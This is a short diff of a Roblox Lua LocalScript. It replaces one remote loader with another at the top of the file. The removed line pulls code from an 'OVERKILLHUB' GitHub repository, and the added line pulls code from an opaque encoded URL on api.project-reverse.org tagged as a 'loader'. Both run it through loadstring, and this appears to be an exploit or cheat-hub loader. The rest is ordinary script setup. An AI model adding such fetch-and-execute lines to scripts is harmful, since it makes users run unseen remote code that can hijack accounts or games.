@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OVERKILLHUB/OKHUB/refs/heads/main/join%20our%20discord"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNmNmMzMDZmLTRhZTQtNDViZS04YzA4LTU5OGIyYzc3NmNkOSIsImtpbmQiOiJsb2FkZXIifQ"))()
 -- LocalScript inside StarterPlayerScripts or StarterGui
 
 local Players = game:GetService("Players")
